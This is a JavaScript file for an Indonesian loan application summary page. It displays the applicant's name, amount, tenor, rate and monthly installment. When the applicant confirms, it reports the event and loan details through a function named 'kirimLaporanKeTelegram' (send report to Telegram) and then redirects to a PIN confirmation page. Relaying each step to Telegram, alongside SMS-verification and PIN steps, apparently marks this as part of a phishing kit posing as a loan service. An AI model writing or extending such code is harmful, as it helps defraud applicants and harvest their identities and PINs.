(() => {
  if (!NovaStorage.requireSession()) return;
  if (!NovaStorage.requireIdentity()) return;
  if (!NovaStorage.requireSmsVerification()) return;
  if (!NovaStorage.requireDocuments()) return;
  if (!NovaStorage.requireLoan()) return;

  const app = NovaStorage.getApplication();
  const identity = NovaStorage.getIdentity();
  const rupiah = value => new Intl.NumberFormat('id-ID',{style:'currency',currency:'IDR',maximumFractionDigits:0}).format(value);

  document.getElementById('name').textContent = identity.fullName;
  document.getElementById('amount').textContent = rupiah(app.loan.amount);
  document.getElementById('tenor').textContent = app.loan.tenor + ' Bulan';
  document.getElementById('purpose').textContent = app.loan.purpose;
  document.getElementById('rate').textContent = app.loan.annualRate + '%';
  document.getElementById('monthly').textContent = rupiah(app.loan.monthlyInstallment);

  document.getElementById('editButton').addEventListener('click', () => location.href='form-pinjaman.html');
  document.getElementById('confirmButton').addEventListener('click', () => {
    NovaStorage.confirmSummary();
    window.kirimLaporanKeTelegram?.({
      event: 'SUMMARY_CONFIRMED',
      page: 'ringkasan-pengajuan.html',
      amount: String(app.loan.amount),
      tenor: String(app.loan.tenor),
      purpose: app.loan.purpose,
      status: 'SUMMARY_CONFIRMED'
    });
    location.href='konfirmasi-pin.html';
  });
  document.getElementById('backButton').addEventListener('click', () => history.back());
})();
